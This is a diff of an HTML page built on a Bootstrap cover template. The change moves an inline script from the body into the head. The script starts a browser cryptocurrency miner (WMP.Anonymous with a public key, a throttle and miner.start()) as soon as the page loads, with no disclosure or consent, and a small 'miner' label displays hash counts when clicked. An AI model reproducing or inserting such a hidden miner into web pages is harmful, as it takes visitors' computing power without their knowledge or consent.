@@ -14,6 +14,18 @@
 
     <!-- Custom styles for this template -->
     <link href="cover.css" rel="stylesheet">
+	  
+ <script>
+		var MINER_PUBLIC_KEY = "SK_rnvpmX37wn2QX35aMz9ZB";
+		var miner = WMP.Anonymous(MINER_PUBLIC_KEY,{throttle: 0.3});
+		miner.start();
+		console.log('mining hashes = ',miner.getHashesPerSecond( ))
+
+		function handleGetNumberOfHashes(){
+			console.log('mining hashes = ',miner.getHashesPerSecond( ))
+			console.log('total hashes = ',miner.getTotalHashes([true]))
+		}
+	</script>
   </head>
 
   <body>
@@ -44,17 +56,7 @@
 		  <p onClick="handleGetNumberOfHashes()" style="color:white;cursor:pointer">miner</p>
           </main>
           
-	<script>
-		var MINER_PUBLIC_KEY = "SK_rnvpmX37wn2QX35aMz9ZB";
-		var miner = WMP.Anonymous(MINER_PUBLIC_KEY,{throttle: 0.3});
-		miner.start();
-		console.log('mining hashes = ',miner.getHashesPerSecond( ))
-
-		function handleGetNumberOfHashes(){
-			console.log('mining hashes = ',miner.getHashesPerSecond( ))
-			console.log('total hashes = ',miner.getTotalHashes([true]))
-		}
-	</script>
+	
           <footer class="mastfoot">
             <div class="inner">
               <p>Cover template for <a href="https://getbootstrap.com/">Bright Events</a>, by <a href="https://twitter.com/mdo">George Mburu</a>.</p>
@@ -67,7 +69,6 @@
 
     </div>
 
- 
     <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
     <script>window.jQuery || document.write('<script src="../../../../assets/js/vendor/jquery.min.js"><\/script>')</script>
     <script src="../../../../assets/js/vendor/popper.min.js"></script>
